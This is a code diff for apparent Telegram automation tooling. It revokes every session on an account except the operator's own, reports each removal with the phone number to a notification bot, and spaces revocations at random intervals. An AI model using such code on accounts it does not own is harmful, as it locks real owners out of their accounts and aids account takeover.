@@ -7,7 +7,7 @@ import { parseError } from '../../../utils/parseError';
 import { fetchWithTimeout } from '../../../utils/fetchWithTimeout';
 import { notifbot } from '../../../utils/logbots';
 import { generateTGConfig } from '../utils/generateTGConfig';
-import { isAuthFingerprintMatch } from '../utils/tg-config';
+import { getAuthProtectionReason, isAuthFingerprintMatch } from '../utils/tg-config';
 import { MailReader } from '../../../IMap/IMap';
 
 export function isOwnAuth(mobile: string, auth: Api.Authorization): boolean {
@@ -23,24 +23,39 @@ export function isOwnAuth(mobile: string, auth: Api.Authorization): boolean {
 export async function removeOtherAuths(ctx: TgContext): Promise<void> {
     if (!ctx.client) throw new Error('Client is not initialized');
     const result = await ctx.client.invoke(new Api.account.GetAuthorizations());
+    const authSummary = result.authorizations.map(formatAuthForLog);
 
     let keptCount = 0;
     let revokedCount = 0;
+    let failedCount = 0;
+    const failedAuths: string[] = [];
+
+    ctx.logger.info(ctx.phoneNumber, `Auth cleanup starting: total=${result.authorizations.length}`, authSummary);
 
     for (const auth of result.authorizations) {
         if (isOwnAuth(ctx.phoneNumber, auth)) {
             keptCount++;
-            ctx.logger.info(ctx.phoneNumber, `Keeping auth: ${auth.appName} | ${auth.deviceModel} | current=${auth.current}`);
+            const protectionReason = auth.current
+                ? 'current'
+                : getAuthProtectionReason(auth) || 'fingerprint_match';
+            ctx.logger.info(ctx.phoneNumber, `Keeping protected auth (${protectionReason}): ${auth.appName} | ${auth.deviceModel} | current=${auth.current}`);
             continue;
         }
         ctx.logger.info(ctx.phoneNumber, `Revoking auth: ${auth.appName} | ${auth.deviceModel} | ${auth.country}`);
         await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Removing Auth\n\nMobile: ${ctx.phoneNumber}\nApp: ${auth.appName || 'unknown'}\nDevice: ${auth.deviceModel || 'unknown'}\nCountry: ${auth.country || 'unknown'}\nAPI ID: ${auth.apiId || 'unknown'}`)}`);
-        await resetAuthorization(ctx, auth);
-        revokedCount++;
+        const revoked = await resetAuthorization(ctx, auth);
+        if (revoked) {
+            revokedCount++;
+        } else {
+            failedCount++;
+            failedAuths.push(formatAuthForLog(auth));
+        }
         await sleep(2000 + Math.random() * 3000); // Pause between revocations
     }
 
-    ctx.logger.info(ctx.phoneNumber, `Auth cleanup: kept ${keptCount}, revoked ${revokedCount}`);
+    ctx.logger.info(ctx.phoneNumber, `Auth cleanup attempted: kept=${keptCount}, revoked=${revokedCount}, failed=${failedCount}`, {
+        failedAuths,
+    });
 
     // CRITICAL: Verify our session survived by making a simple API call
     try {
@@ -53,13 +68,39 @@ export async function removeOtherAuths(ctx: TgContext): Promise<void> {
         ctx.logger.error(ctx.phoneNumber, 'CRITICAL: Our session may have been revoked during removeOtherAuths!', verifyError);
         throw new Error(`Session self-check failed after removeOtherAuths: ${verifyError}`);
     }
+
+    const afterResult = await ctx.client.invoke(new Api.account.GetAuthorizations());
+    const remainingOtherAuths = afterResult.authorizations.filter((auth) => !isOwnAuth(ctx.phoneNumber, auth));
+    ctx.logger.info(ctx.phoneNumber, `Auth cleanup verified: total=${afterResult.authorizations.length}, remainingOther=${remainingOtherAuths.length}`, {
+        authorizations: afterResult.authorizations.map(formatAuthForLog),
+    });
+
+    if (failedCount > 0 || remainingOtherAuths.length > 0) {
+        throw new Error(
+            `removeOtherAuths incomplete: failed=${failedCount}, remainingOther=${remainingOtherAuths.length}, remaining=${remainingOtherAuths.map(formatAuthForLog).join('; ')}`,
+        );
+    }
 }
 
-async function resetAuthorization(ctx: TgContext, auth: Api.Authorization): Promise<void> {
+function formatAuthForLog(auth: Api.Authorization): string {
+    return [
+        `app=${auth.appName || 'unknown'}`,
+        `device=${auth.deviceModel || 'unknown'}`,
+        `country=${auth.country || 'unknown'}`,
+        `current=${Boolean(auth.current)}`,
+        `apiId=${auth.apiId || 'unknown'}`,
+        `hash=${auth.hash?.toString?.() || 'unknown'}`,
+    ].join(' | ');
+}
+
+async function resetAuthorization(ctx: TgContext, auth: Api.Authorization): Promise<boolean> {
     try {
         await ctx.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));
+        return true;
     } catch (error) {
         parseError(error, `Failed to reset authorization for ${ctx.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel} `);
+        ctx.logger.error(ctx.phoneNumber, `Failed to revoke auth: ${formatAuthForLog(auth)}`, error);
+        return false;
     }
 }
 
